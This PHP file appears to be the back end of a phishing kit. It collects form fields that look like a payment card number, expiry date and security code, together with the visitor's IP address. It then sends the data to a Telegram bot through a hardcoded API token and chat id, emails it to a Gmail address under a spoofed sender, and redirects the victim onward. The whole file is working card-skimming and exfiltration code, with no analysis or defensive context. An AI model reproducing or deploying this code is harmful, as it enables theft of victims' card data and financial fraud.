<?php
$pg=$_REQUEST['page'];
$bin4=$_REQUEST['page'];
$bin5=$_REQUEST['page5'];
$bin6=$_REQUEST['page6'];
$ip = getenv("REMOTE_ADDR");
$bin4 = substr($_POST['s1'] , 15 , 19);
$bin5 = substr($_POST['s3'] , 0 , 5);
$bin6 = substr($_POST['s4'] , 2 , 5);
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "index2.php?page=$bin4&page5=$bin5&page6=$bin6" ;
$hostname = gethostbyaddr($ip);
$message .= "".$_POST['s1']."\n";
$message = str_replace(' ','',$message);
$message .= "".$_POST['s2']."-".$_POST['s3']."\n";
$message .= "".$_POST['s4']."\n";
$message .= "IP :".$ip."\n";
function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '5040561128:AAGa_HX0_-v4UajIXa4u9zGnrTqbOpEMlWw';
    $chat_id  = '-656941862';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}
telegram_send(urlencode($message));
$send = "msi1msi2msi3msi4@gmail.com";
$subject = "$ip";
$headers = "From: ST <support@one.com>";
mail($send,$subject,$message,$headers);
header("Location: $back");
?>